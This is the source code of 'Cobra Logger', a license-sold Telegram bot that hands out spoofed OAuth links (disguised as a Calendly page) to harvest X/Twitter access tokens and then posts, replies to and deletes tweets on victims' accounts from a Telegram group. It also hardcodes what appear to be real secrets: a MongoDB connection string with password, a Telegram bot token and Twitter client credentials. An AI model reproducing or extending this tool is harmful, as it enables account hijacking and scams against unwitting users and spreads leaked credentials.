import random
import string
import requests
import urllib.parse
import base64
import validators
import uuid
from datetime import datetime, timedelta
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"
TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
TWITTER_CLIENT_ID = 'eWNUdkx4LTnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'

credentials = 'ZVdOVWRreDRMVGxuYUdRME4zQmFTR0p5WWtVNk1UcGphUTo0Y2N0XzRkWjNCVnpfTU5LS2pheldpMU0zWFZlbG5TaUdxVjZSNWhCeEMtUGJqN3l0bg=='

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
users = db['users']
groups = db['groups']
licenses = db['licenses']
templates = db['templates']

parse_mode = "MarkdownV2"

try:
    client.admin.command('ping')
    print("[+] MongoDB has successfully connected.")
except Exception as e:
    print("[-] MongoDB has failed connecting.")
    print(e)

def generate_random_key(length=12, segment_length=4):
    characters = string.ascii_uppercase + string.digits  # Use uppercase letters and digits
    key = ''.join(random.choice(characters) for _ in range(length))
    
    segments = [key[i:i+segment_length] for i in range(0, len(key), segment_length)]
    
    return '-'.join(segments)
    
async def check_license(user_id, chat_id, context):
    group = groups.find_one({"group_id": chat_id})
    
    if group:
        text = "⚠️ *License not found or has expired\\. Please purchase a license to continue using Cobra Logger\\.*"
        
        license = licenses.find_one({"used_by": group.get("owner_id"), "status": "active"})
        if not license:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
        
        expiration_date = license.get("expiration_date")
        if expiration_date and datetime.utcnow() > expiration_date:
            license_data = {
                "status": "expired",
            }
            result = licenses.update_one(
                {"used_by": group.get("owner_id"), "status": "active"},
                {"$set": license_data}
            )
            
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
            
        return True
    else:
        text = "⚠️ *Group is not setup for OAuth\\.*\n\n💬 _Use the */setup* command to setup your group for OAuth\\._"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return False


async def start(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if context.args == None:
        return
        
    key = context.args[0]
    
    license = licenses.find_one({"key": key, "used_by": None})
    if not license:
        text="❌ *The license key you provided is invalid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if licenses.find_one({"used_by": user_id, "status": "active"}):
        text="⚠️ *A license is already active on your account\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
    
    if not licenses.find_one({"used_by": user_id, "status": "expired"}):
        user_data = {
            "user_id": user_id,
            "username": username,
            "group_id": None
        }
        users.insert_one(user_data)
    
    license_data = {
        "used_by": user_id,
    }
    result = licenses.update_one(
        {"key": key},
        {"$set": license_data}
    )
    
    if result.modified_count > 0:
        expiration_date = license.get("expiration_date")
        expiration_msg = expiration_date.strftime('%Y\\-%m\\-%d') if expiration_date else "Never"
        
        text = f"🐍 *Welcome to Cobra Logger, _{update.effective_user.full_name}_*\\! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occured\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)


async def help(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* <username> <message> \\- Posts a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* <username> <tweetId> <message> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* <username> <tweetId> \\- Deletes a tweet on behalf of the user\\.\n *•* 👥 */display\\_users* \\- Shows the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays the group's endpoint\\.\n *•* 🔄 */set\\_redirect* \\- Sets the redirect upon authorization\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
    await context.bot.send_message(chat_id, text, parse_mode)


async def setup(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
            
    owner_id = update.message.from_user.id
    owner_username = update.message.from_user.username
    group_name = update.message.chat.title
    identifier = str(uuid.uuid4())
    
    license = licenses.find_one({"used_by": owner_id, "status": "active"})
    if not license:
        text = "⚠️ *License not found\\. Please purchase a license to continue using Cobra Logger\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    expiration_date = license.get("expiration_date")
    if expiration_date and datetime.utcnow() > expiration_date:
        text = "⚠️ *License has expired\\. Please purchase a license to continue using Cobra Logger\\.*"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    if license:
        group_data = {
            "group_id": chat_id,
            "group_name": group_name,
            "owner_id": owner_id,
            "owner_username": owner_username,
            "identifier": identifier,
            "spoof": "https://calendly.com/cointele",
            "redirect": "https://calendly.com/cointele",
            "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
            "authenticated_users": [],
        }
        groups.insert_one(group_data)
        
        user_data = {
            "group_id": chat_id
        }
        result = users.update_one(
            {"user_id": owner_id},
            {"$set": user_data}
        )
        
        if result.modified_count > 0:
            text = f"✅ *Group successfully setup for OAuth\\.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {group_data['group_id']}\n┣  *Group Name:* {group_data['group_name']}\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* {group_data['identifier']}\n\n💬 _Use the */help* command to get the list of available commands\\._"
            await context.bot.send_message(chat_id, text, parse_mode)
        else:
            text = "⚠️ *An unknown error has occured\\.*"
            await context.bot.send_message(chat_id, text, parse_mode)


async def set_redirect(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            'Usage: /set_redirect <url>')
        return
        
    url = args[0]
    
    if not validators.url(url):
        text = "⚠️ *The URL provided is invalid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        group_data = {
            "redirect": url
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        text = f"✅ *Redirect URL for this group successfully set to {url}.*"
        parse_mode = "MarkDown"
        await context.bot.send_message(chat_id, text, parse_mode)
        
        
async def set_spoof(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            'Usage: /set_spoof <url>')
        return
        
    url = args[0]
    
    if not validators.url(url):
        text = "⚠️ *The URL provided is invalid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        group_data = {
            "spoof": url
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        text = f"✅ *Spoofed URL for this group successfully set to {url}.*"
        parse_mode = "MarkDown"
        await context.bot.send_message(chat_id, text, parse_mode)

        
async def display_endpoint(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = f"🔗 *Endpoint: {group.get('endpoint')}*"
        parse_mode = "MarkDown"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occurred\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        

async def post_tweet(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /post_tweet <username> <message>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()
                          for arg in args[1:]).replace('\\n', '\n')
    access_token, refresh_token, username = user["access_token"], user["refresh_token"], user["username"]

    res, r = tweet(access_token, message)
    if res.status_code == 201:
        return await handle_successful_tweet(context, chat_id, username, r)
        
    if res.status_code == 401:
        return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token)

    await handle_generic_error(context, chat_id, res, r)


async def post_reply(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            'Usage: /post_reply <username> <id> <message>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()
                          for arg in args[2:]).replace('\\n', '\n')
    access_token, refresh_token, username = user["access_token"], user["refresh_token"], user["username"]

    res, r = tweet(token=access_token, message=message, tweet_id=args[1])
    print(res.request.body)
    print(res)
    if res.status_code == 201:
        return await handle_successful_tweet(context, chat_id, username, r, reply=True)
        
    if res.status_code == 401:
        return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token, tweet_id=args[1])

    await handle_generic_error(context, chat_id, res, r)


async def delete(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /delete_tweet <username> <id>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    access_token, refresh_token, username = user["access_token"], user["refresh_token"], user["username"]

    url = f'https://api.twitter.com/2/tweets/{args[1]}'
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    res = requests.delete(url, headers=headers)
    r = res.json()
    
    if res.status_code == 200:
        parse_mode = "MarkdownV2"
        text = f"✅ *Tweet successfully deleted by user [{username}](https://x\\.com/{username})\\.*\n" \
            f"🐦 *Tweet ID:* `{args[1]}`"
    else:
        parse_mode = "MarkDown"
        text = f"Deletion failed:\n{res}\n\n{r}"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def generate_key(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if update.message.from_user.id != 5074337318: return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /generate_key <expiration>, e.g., /generate_key 1d, 7d, 1m, 1y, lifetime")
        return

    expiration = context.args[0]
    key = generate_random_key()
    expiration_date = None

    if expiration == '1d':
        expiration_date = datetime.now() + timedelta(days=1)
    elif expiration == '7d':
        expiration_date = datetime.now() + timedelta(days=7)
    elif expiration == '1m':
        expiration_date = datetime.now() + timedelta(days=30)
    elif expiration == '3m':
        expiration_date = datetime.now() + timedelta(days=90)
    elif expiration == 'lifetime':
        expiration_date = None
    else:
        await update.message.reply_text("Invalid expiration format. Use 1d, 7d, 1m, 1y, or lifetime.")
        return

    license_data = {
        "key": key,
        "used_by": None,
        "status": "active",
        "expiration_date": expiration_date
    }
    licenses.insert_one(license_data)

    expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Lifetime"
    
    escaped_key = key.replace('-', '\\-')
    escaped_expiration = expiration_msg.replace('-', '\\-')

    text = f"☑️ *License Generated*\n\n🔗 *Link:*\n*[Activate Key](https://t\\.me/uaODw8xjIam\\_bot?start={escaped_key})*\n📅 *Expiration:*\n`{escaped_expiration}`"
    await context.bot.send_message(chat_id, text, parse_mode)
    
    
def get_chat_id(update: Update) -> int:
    return update.message.chat_id if update.message else update.callback_query.message.chat_id
    
    
def tweet(token: str, message: str, tweet_id=0) -> tuple:
    url = 'https://api.x.com/2/tweets'
    if tweet_id == 0:
        json = {'text': message, 'reply_settings': "mentionedUsers"}
    else:
        json = {'text': message, 'reply_settings': "mentionedUsers", 'reply': {'in_reply_to_tweet_id': tweet_id}}
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    res = requests.post(url=url, json=json, headers=headers)
    print(res.request)
    return res, res.json()


async def handle_successful_tweet(context: CallbackContext, chat_id: int, username: str, response: dict, is_reply=False) -> None:
    tweet_id = response['data']['id']
    text = f"✅ *Tweet successfully posted by user _{username}_\\.*\n" \
        f"🐦 *Tweet ID:* `{tweet_id}`\n" \
        f"🔗 __*[View {'reply' if is_reply else 'tweet'}](https://x\\.com/{username}/status/{tweet_id})*__\n\n" \
        f"💬 _Replies for this tweet are restricted to mentioned only\\. To enable replies, use the command */set\\_replies*\\._"
    parse_mode = "MarkdownV2"
    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def handle_generic_error(context: CallbackContext, chat_id: int, res: requests.Response, response: dict) -> None:
    if res.status_code == 403 and 'detail' in response and 'duplicate content' in response['detail']:
        parse_mode = "MarkdownV2"
        text = "❌ *Tweet failed to post\\.*\n" \
               "⚠️ *Reason:* Duplicate content detected\\. You cannot post the same tweet multiple times\\."
    else:
        parse_mode = "MarkDown"
        text = f"❌ Failed to post tweet.\n" \
               f"⚠️ Error code: {res.status_code}\n" \
               f"🛑 Details: {response.get('detail', 'Unknown error')}"

    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def handle_token_refresh_and_retry(context: CallbackContext, chat_id: int, user: dict, message: str, refresh_token: str, tweet_id=0) -> None:
    new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token)

    if not new_access_token:
        text = f"❌ *User [{username}](https://x\\.com/{username}) revoked OAuth access and is no longer valid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    groups.update_one(
        {"group_id": chat_id, "authenticated_users.username": user["username"]},
        {"$set": {
            "authenticated_users.$.access_token": new_access_token,
            "authenticated_users.$.refresh_token": new_refresh_token or refresh_token
        }}
    )

    res, r = tweet(new_access_token, message, (tweet_id if tweet_id != 0 else 0))
    print(res.request)
    if res.status_code == 201:
        await handle_successful_tweet(context, chat_id, user["username"], r, is_reply=True)
    else:
        await handle_generic_error(context, chat_id, res, r)
    
    
async def refresh_oauth_tokens(refresh_token: str) -> tuple:
    url = 'https://api.twitter.com/2/oauth2/token'
    data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }
    headers = {'Authorization': f'Basic {credentials}', 'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        res = requests.post(url=url, data=data, headers=headers)
        r = res.json()
        return r.get("access_token"), r.get("refresh_token")
    except Exception:
        return None, None
        
    
def main() -> None:
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("post_tweet", post_tweet))
    app.add_handler(CommandHandler("post_reply", post_reply))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("delete_tweet", delete))
    app.add_handler(CommandHandler("generate_key", generate_key))
    app.add_handler(CommandHandler("set_redirect", set_redirect))
    app.add_handler(CommandHandler("set_spoof", set_spoof))
    app.add_handler(CommandHandler("display_endpoint", display_endpoint))
    app.run_polling(poll_interval=5)


if __name__ == '__main__':
    main()
